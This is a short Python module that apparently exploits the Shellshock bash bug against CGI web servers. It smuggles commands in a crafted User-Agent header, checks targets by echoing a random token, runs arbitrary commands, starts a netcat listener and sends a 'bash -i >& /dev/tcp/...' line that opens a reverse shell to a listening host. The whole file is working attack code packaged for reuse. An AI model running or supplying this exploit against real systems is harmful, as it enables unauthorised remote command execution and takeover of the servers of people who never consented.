#!/usr/bin/env python3.4
# -*- coding: utf-8 -*-
import os
import requests

from uuid import uuid4


def is_vulnerable(url):
    check = str(uuid4())
    command = "echo {}".format(check)
    resp = send_command(url, command)
    if (check == resp[:len(check)]):
        return True
    return False


def send_command(url, command, path="/usr/sbin:/usr/bin:/sbin:/bin"):
    ua = "() { :;}; echo 'Content-type: text/plain'; echo; "
    ua += "PATH={} ".format(path)
    ua += "{}; exit".format(command)
    headers = {"User-Agent": ua}
    return requests.get(url, headers=headers, verify=False).text[:-1]


def make_listener(url, port=8080):
    cmd = "nc -l -p {} -vvv".format(port)
    print(cmd)
    return os.system(cmd)


def get_shell(url, host="10.0.2.2", port=8080):
    cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(host, port)
    print("sending {}".format(cmd))
    send_command(url, cmd)


__all__ = ["is_vulnerable", "send_command", "make_listener", "get_shell"]
